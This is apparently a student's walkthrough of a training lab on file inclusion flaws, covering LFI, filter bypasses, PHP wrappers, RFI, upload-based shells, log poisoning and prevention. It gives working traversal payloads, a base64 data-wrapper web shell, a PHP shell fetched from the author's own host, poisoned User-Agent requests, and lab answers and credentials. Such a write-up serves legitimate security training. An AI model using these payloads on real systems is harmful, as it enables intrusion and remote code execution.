@@ -1,0 +1,431 @@
+[Local File Inclusion (LFI)]
+
+[*] Target: 134.209.176.83:31014
+
+[Question 1] Using the file inclusion find the name of a user on the system that starts with "b".
+
+    - So if you go to http://134.209.176.83:31014 and choose the language "English" => http://134.209.176.83:31014/index.php?language=en.php
+
+        => "en.php: is a file in the system, and can be used through "?language=" 
+
+        => This can be a big vulnerability without a suitable sanitization
+
+    => If you follow http://134.209.176.83:31014/index.php?language=../../../../etc/passwd
+
+    [Note] I guess ../../../../ <=> /var/www/html/language
+
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        bin:x:2:2:bin:/bin:/usr/sbin/nologin
+        ...
+        barry:x:1000:1000::/home/barry:/bin/sh
+
+    [!] Answer: "barry"
+
+[Question 2] Submit the contents of the flag.txt file located in the /usr/share/flags directory.
+
+    - So! use the same logic as the previous question, we have http://134.209.176.83:31014/index.php?language=../../../../usr/share/flags/flag.txt
+
+    => HTB{n3v3r_tru$t_u$3r_!nput}
+
+    [!] Answer: "HTB{n3v3r_tru$t_u$3r_!nput}"
+
+
+[Basic Bypasses]
+
+[*] Target: 161.35.168.143:30959
+
+[Question 1] The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
+
+    - After going to the webpage and choosing the English language => http://161.35.168.143:30959/index.php?language=languages/en.php
+
+    - But if you delete the "languages/en.php" <=> http://161.35.168.143:30959/index.php?language= => Illegal path specified!
+
+    - Kind the same with the below situation:
+
+            if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
+                include($_GET['language']);
+            } else {
+                echo 'Illegal path specified!';}
+
+    - But exactly what I thought (../../../../ <=> /var/www/html/language), we can use this trick 
+
+    => http://161.35.168.143:30959/index.php?language=languages/....//....//....//....//flag.txt => HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
+
+    [!] Answer: "HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}"
+
+
+[PHP Filters]
+
+[*] Target: 134.209.176.83:31041
+
+[Question 1] Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer
+
+    - This time, if you choose the English language => http://134.209.176.83:31041/index.php?language=en
+
+        => Yeah! ".php" is in the back-end
+
+    => http://134.209.176.83:31041/index.php?language=php://filter/read=convert.base64-encode/resource=en => PD9waHAK...48L3A+IjsKPz4=
+
+            # ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://134.209.176.83:31041/index.php?language=php://filter/read=convert.base64-encode/resource=FUZZ' -fs 2278
+                      ____    ____             ____
+                     /'___\  /'___\           /'___\       
+                    /\ \__/ /\ \__/  __  __  /\ \__/       
+                    \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                     \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                      \ \_\   \ \_\  \ \____/  \ \_\       
+                       \/_/    \/_/   \/___/    \/_/       
+
+                v1.4.1-dev
+            ________________________________________________
+
+            :: Method           : GET
+            :: URL              : http://134.209.176.83:31041/index.php?language=php://filter/read=convert.base64-encode/resource=FUZZ
+            :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+            :: Follow redirects : false
+            :: Calibration      : false
+            :: Timeout          : 10
+            :: Threads          : 40
+            :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+            :: Filter           : Response size: 2278
+            ________________________________________________
+
+            en                      [Status: 200, Size: 2802, Words: 634, Lines: 64, Duration: 1ms]
+            es                      [Status: 200, Size: 2886, Words: 634, Lines: 64, Duration: 1ms]
+            index                   [Status: 200, Size: 5558, Words: 634, Lines: 64, Duration: 683ms]
+            configure               [Status: 200, Size: 2822, Words: 634, Lines: 64, Duration: 1ms]
+            :: Progress: [87664/87664] :: Job [1/1] :: 3594 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
+
+    => http://134.209.176.83:31041/index.php?language=php://filter/read=convert.base64-encode/resource=configure => PD9waHAKC...NDYrMzUvayI7
+
+        <?php
+
+        if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
+        header('HTTP/1.0 403 Forbidden', TRUE, 403);
+        die(header('location: /index.php'));
+        }
+
+        $config = array(
+        'DB_HOST' => 'db.inlanefreight.local',
+        'DB_USERNAME' => 'root',
+        'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
+        'DB_DATABASE' => 'blogdb'
+        );
+
+        $API_KEY = "Awew242GDshrf46+35/k";
+
+    [!] Answer: "HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}"
+
+
+[PHP Wrappers]
+
+[*] Target: 161.35.168.143:31819
+
+[Question 1] Try to gain RCE using one of the PHP wrappers and read the flag at /
+
+    - You can use http://161.35.168.143:31819/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=<command> to RCE
+
+    [Note] %3C?php%20system($_GET%5B%22cmd%22%5D);%20?%3E <=> <?php+system($_GET["cmd"]);+?>
+
+        [?] The data scheme is commonly used to embed data directly into a URL.
+
+        [?] text/plain portion indicates that the data being embedded is in plain text format.
+
+        => which mean "allow_url_include = On"
+
+    => http://161.35.168.143:31819/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt
+
+    => HTB{d!$46l3_r3m0t3_url_!nclud3}
+
+    [!] Answer: "HTB{d!$46l3_r3m0t3_url_!nclud3}"
+
+
+[Remote File Inclusion (RFI)]
+
+[*] Target: 10.129.194.233
+
+[Question 1] Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
+
+    - If you go to http://10.129.194.233/index.php?language=http://127.0.0.1:80/index.php => Some kind of loop appears in the "History" post
+
+        => So basically it can use the resources from any URL
+
+        => echo '<?php system("whoami"]); ?>' > shell.php && python3 -m http.server 1234
+
+        => http://10.129.194.233/index.php?language=http://10.10.16.6:1234/shell.php => www-data
+
+        => <?php system("find / -name '*flag*' 2>/dev/null"); ?> => ... /exercise/flag.txt
+
+        => <?php system("cat /exercise/flag.txt"); ?> => 99a8fc05f033f2fc0cf9a6f9826f83f4
+
+    [Note] So there is another way to do this 
+
+        # echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+        => http://10.129.194.233/index.php?language=http://10.10.16.6:1234/shell.php&cmd=whoami
+
+        [?] "&" help you change the value of a parameter, with "&" the target will get the shell.php with content now turned into <?php system("whoami"]); ?>
+
+            => Our listener: 10.129.194.233 - - [09/Jun/2023 05:49:46] "GET /shell.php HTTP/1.0" 200 -
+
+        [?] "?" help you send the parameter to the back-end (in this case is our listener) not to replace the parameter => can't be used in this situation
+
+            => Our listener: 10.129.194.233 - - [09/Jun/2023 06:25:44] "GET /shell.php?cmd=cat /exercise/flag.txt HTTP/1.0" 400 -
+
+    [!] Answer: "99a8fc05f033f2fc0cf9a6f9826f83f4"
+
+
+[LFI and File Uploads]
+
+[*] Target: 157.245.32.216:31197
+
+[Question 1] Use any of the techniques covered in this section to gain RCE and read the flag at /
+
+    - If you go to http://157.245.32.216:31964/settings.php then upload any image, you can see this in the page's source covered
+
+        => <img src='/profile_images/shell.jpg' class='profile-image' id='profile-image'> , so now we know where the image is stored
+
+    - You use some "File Upload" techniques but in this case, I use the following Method
+
+    [Step 1] Create our payload and zip it in a jpg file
+
+        # echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+
+    [Step 2] Upload the "image" and use the trick we learned in this section
+
+        => http://157.245.32.216:31964/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id => uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+            [?] "zip://" URL scheme is used in programming or scripting languages to access and manipulate files within ZIP archives
+
+            [?] A fragment identifier ("#") is typically used to identify a specific section within a document
+                => "%23" <=> "#" represents the fragment identifier. It suggests that the file "shell.jpg" within the ZIP archive is being accessed
+                and the fragment identifier "shell.php&cmd=id" may be used for a specific purpose within the context of the ZIP file or the application handling it
+
+    => http://157.245.32.216:31964/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
+
+    => HTB{upl04d+lf!+3x3cut3=rc3}
+
+    [!] Answer: "HTB{upl04d+lf!+3x3cut3=rc3}"
+
+
+[Log Poisoning]
+
+[*] Target: 167.172.63.144:32544
+
+[Question 1] Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd
+
+    - So! from this section, we know that /var/lib/php/sessions/sess_<cookie> contains the value of the page, which shows the selected language page, and preference, which shows the selected language
+
+        => If you go to http://167.172.63.144:32544/index.php?language=thinhdeptraiprovip
+
+        => http://167.172.63.144:32544/index.php?language=/var/lib/php/sessions/sess_hfspljfcoppf7cesf6jgtme94d => selected_language|s:18:"thinhdeptraiprovip";preference|s:7:"Spanish";
+
+    - You can write your own payload into your own session (PHP is a wise choice since the web was made from programming language)
+
+        => http://167.172.63.144:32544/index.php?language=%3C?php%20system(%22pwd%22);?%3E
+
+        => http://167.172.63.144:32544/index.php?language=/var/lib/php/sessions/sess_hfspljfcoppf7cesf6jgtme94d => selected_language|s:22:"/var/www/html";preference|s:7:"Spanish";
+
+    [!] Answer: "/var/www/html"
+
+[Question 2] Try to use a different technique to gain RCE and read the flag at /
+
+    GET /index.php?language=../../../../var/log/apache2/access.log&cmd=ls+/ HTTP/1.1
+    Host: 157.245.32.216:31391
+    User-Agent: <?php system($_GET[cmd]); ?>
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Cookie: PHPSESSID=1tp9p924h11jt9i3gkd4mugql3
+    Upgrade-Insecure-Requests: 1
+    
+    => ... c85ee5082f4c723ace6c0796e3a3db09.txt
+
+    [Note] The access.log file itself is a static log file that records HTTP requests, and it does not have the ability to interpret or execute PHP code. 
+           The PHP code you included would only be executed if it were embedded within a PHP file and processed by a PHP interpreter.
+
+     Client                     Web Server                    PHP Interpreter
+   +--------+                  +----------+                 +-----------------+
+   |        |    HTTP Request  |          |    PHP File     |                 |
+   |Browser +----------------->|  Web     +---------------> | PHP Interpreter |
+   |        |                  |  Server  |    Processing   |                 |
+   +--------+                  +----------+                 +-----------------+
+       |                             |                               |
+       |     HTTP Response           |                               |
+       + <---------------------------+                               |
+                                     |                               |
+                                     |        PHP Code Execution     |
+                                     +------------------------------>|
+
+    GET /index.php?language=../../../../var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt HTTP/1.1
+    Host: 157.245.32.216:31391
+    User-Agent: <?php system($_GET[cmd]); ?>
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Cookie: PHPSESSID=1tp9p924h11jt9i3gkd4mugql3
+    Upgrade-Insecure-Requests: 1
+
+    => /index.php?language=../../../../var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt HTTP/1.1" 200 1549 "-" "HTB{1095_5#0u1d_n3v3r_63_3xp053d}
+
+    [Note] Ofcourse you can just <?php system("ls /"); ?> right into the User-Agent but depending on the server's configuration and security measures
+           => This could potentially trigger a 500 Internal Server Error response code if the server denies executing commands via the User-Agent header.
+
+    [!] Answer: "HTB{1095_5#0u1d_n3v3r_63_3xp053d}"
+
+
+[Automated Scanning]
+
+[*] Target: 161.35.170.221:30959
+
+[Question 1] Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
+
+    - Look at this webpage we all know that we are in the index.php right =)) So now I am going to start brute-forcing the necessary parameter oke
+
+    $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://161.35.170.221:30959/index.php?FUZZ=value' -fs 2309
+
+            /'___\  /'___\           /'___\       
+           /\ \__/ /\ \__/  __  __  /\ \__/       
+           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+             \ \_\   \ \_\  \ \____/  \ \_\       
+              \/_/    \/_/   \/___/    \/_/       
+
+        v1.4.1-dev
+    ________________________________________________
+
+    :: Method           : GET
+    :: URL              : http://161.35.170.221:30959/index.php?FUZZ=value
+    :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+    :: Follow redirects : false
+    :: Calibration      : false
+    :: Timeout          : 10
+    :: Threads          : 40
+    :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+    :: Filter           : Response size: 2309
+    ________________________________________________
+
+    view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 3ms]
+    :: Progress: [2588/2588] :: Job [1/1] :: 9209 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
+
+    => Good! So now we should find the suitable payload, you can use the list I gave you, named "CBBH_LFI.txt" (this list took me 1 hour to create =(( )
+
+    - After brute-forcing, I found some payloads that we can use to read the passwd's content
+
+    ../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+    ../../../../../../../../../../../../../../../../../../../../../etc/passwd
+    ../../../../../../../../../../../../../../../../../../../../etc/passwd
+    ../../../../../../../../../../../../../../../../../../../etc/passwd
+    ../../../../../../../../../../../../../../../../../../etc/passwd
+    ../../../../../../../../../../../../../../../../../etc/passwd
+    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+
+    => http://161.35.170.221:30959/index.php?view=../../../../../../../../../../../../../../../../../flag.txt => HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
+
+    [!] Answer: "HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}"
+
+
+[File Inclusion Prevention]
+
+[*] Target: 10.129.29.112
+
+[*] SSH to 10.129.29.112 with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+[Question 1] What is the full path to the php.ini file for Apache?
+
+    - After login with the given credential => find / -name php.ini 2>/dev/null
+
+    => /etc/php/7.4/apache2/php.ini
+
+    [!] Answer: "/etc/php/7.4/apache2/php.ini"
+
+[Question 2] Edit the php.ini file to block system(), then try to execute PHP Code that uses system(). Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.
+
+    - They already tell you what you need to do step by step in the question already so, I think I don't need to repeat it again
+
+    - And if you want to execute PHP Code just place a PHP File in /var/www/html/ which contains a PHP Webshell using SYSTEM(), then use curl to execute the file. 
+    
+      [Note] Be sure to restart apache after editing the PHP configuration
+
+    => "system() has been disabled for security reasons" sounds familiar right
+
+    [!] Answer: "security"
+
+[Skills Assessment - File Inclusion]
+
+[*] Target: 157.245.32.216:31465
+
+[Question 1]  Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
+
+    - Go to the website you can see
+
+        [+] http://157.245.32.216:31465/index.php?page=industries
+        
+        [+] http://157.245.32.216:31465/index.php?page=about
+        
+        [+] http://157.245.32.216:31465/index.php?page=contact
+
+    - All of them are missing extensions, in this case, might be ".php"
+
+    - In this case we already know that there might be a file called about.php (contact.php, industries.php if you want)
+
+    => Some techniques can be useful:
+
+        [1] http://157.245.32.216:31465/index.php?page=http://10.10.16.6:4444/test.php?filename=123 => nope it didn't work
+
+        [2] http://157.245.32.216:31465/index.php?page=php://filter/read=convert.base64-encode/resource=about => it's worked
+
+    - After base64 decoded, you will have something like a front-end code => no clue
+
+    => http://157.245.32.216:31465/index.php?page=php://filter/read=convert.base64-encode/resource=index => // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
+
+    [Tips] You just need to look for "href"
+
+    - Go to http://157.245.32.216:31465/ilf_admin/index.php you can see all kinds of logs => Now use the list I gave you to read the /etc/passwd (just to find to suitable payload)
+
+    => ../../../../../etc/passwd worked just fine 
+
+    [Note] http://157.245.32.216:31465/ilf_admin/index.php?log=http://10.10.16.6:4444/test.php?hahajustatestmess => Not work
+
+           http://157.245.32.216:31465/ilf_admin/index.php?log=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id => Not work
+        
+           http://157.245.32.216:31465/ilf_admin/index.php?log=../../../../../var/lib/php/sessions/sess_of5lrhlm7kaaj7f83l82j74v9e => Not work
+
+           http://157.245.32.216:31465/ilf_admin/index.php?log=../../../../../var/log/apache2/access.log => Not work
+
+           http://157.245.32.216:31465/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log => Yeah! it worked
+
+    => Using the Log Poisoning technique, we finally can RCE this website
+
+        GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log HTTP/1.1
+        Host: 157.245.32.216:31465
+        User-Agent: Thinhdeptraiprovip
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: PHPSESSID=of5lrhlm7kaaj7f83l82j74v9e
+        Upgrade-Insecure-Requests: 1
+
+    => /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log HTTP/1.1" 200 10118 "-" "Thinhdeptraiprovip"
+
+        GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat+/flag_dacc60f2348d.txt HTTP/1.1
+        Host: 157.245.32.216:31465
+        User-Agent: <?php system($_GET[cmd]); ?>
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: uid=52; PHPSESSID=to6djb1ojv8q2e2l6b4cbkgni6
+        Upgrade-Insecure-Requests: 1
+
+        => a9a892dbc9faf9a014f58e007721835e
+
+    [!] Answer: "a9a892dbc9faf9a014f58e007721835e"
